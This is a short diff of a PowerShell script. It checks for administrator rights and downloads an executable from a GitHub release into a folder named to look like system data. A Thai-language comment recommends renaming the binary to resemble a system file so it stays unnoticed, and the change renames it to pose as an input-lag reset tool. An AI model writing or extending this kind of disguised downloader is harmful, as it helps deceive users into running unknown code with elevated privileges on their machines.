@@ -6,7 +6,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 
 # 2. ตั้งค่า (แนะนำให้เปลี่ยนชื่อไฟล์ .exe เป็นชื่อที่ดูเหมือนไฟล์ระบบ เช่น TaskHost.exe จะเนียนขึ้น)
 $url = "https://github.com/getx796-Harem/GetX/releases/download/v1.0/DESUS.PANEL.exe"
-$fileName = "DESUS.PANEL.exe"
+$fileName = "reset.inputlag.exe"
 $workDir = "$env:LOCALAPPDATA\Temp\SystemData"
 $exePath = Join-Path $workDir $fileName
 
